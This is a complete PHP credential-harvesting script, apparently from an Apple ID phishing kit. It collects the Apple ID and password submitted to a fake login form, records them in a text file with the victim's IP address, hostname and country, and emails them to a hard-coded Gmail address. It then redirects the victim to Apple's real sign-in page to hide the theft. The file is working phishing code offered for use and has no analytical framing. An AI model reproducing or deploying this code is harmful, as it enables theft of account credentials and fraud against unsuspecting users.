<?php


$ip = getenv("REMOTE_ADDR");                                                                          
$hostname = gethostbyaddr($ip);

// include the php script
include("geoip.inc");

// open the geoip database
$gi = geoip_open("GeoIP.dat",GEOIP_STANDARD);

// to get country code
$country_code = geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']);

// to get country name
$country_name = geoip_country_name_by_addr($gi, $_SERVER['REMOTE_ADDR']);







$id=$_REQUEST['appleId'];
$pass=$_REQUEST['accountPassword'];

$monfichier = fopen('spam.txt','a+');
fputs($monfichier,"==========================================================================="); 
fputs($monfichier,"\r\n".'Email = '. $id."\r\n".'Password = '.$pass."\r\n"."IP = ".$ip."\r\n".'Hostname ='.$hostname."\r\n"."Country = ".$country_name."\r\n");
fclose($monfichier);







$mail="bouha51@gmail.com";
mail($mail,"APPLE","login et password apple :: ".$id."  ||   ".$pass);
print("<script type=\"text/javascript\">setTimeout('location=(\"https://idmsa.apple.com//IDMSWebAuth/login.html?appIdKey=05c7e09b5896b0334b35d57cea43564ad699eb93fb46e9beb9c26cc3091ba2bf&appleId=".$_REQUEST['appleId']."&accountPassword=".$_REQUEST['accountPassword']."\")' ,0);</script>");

?>



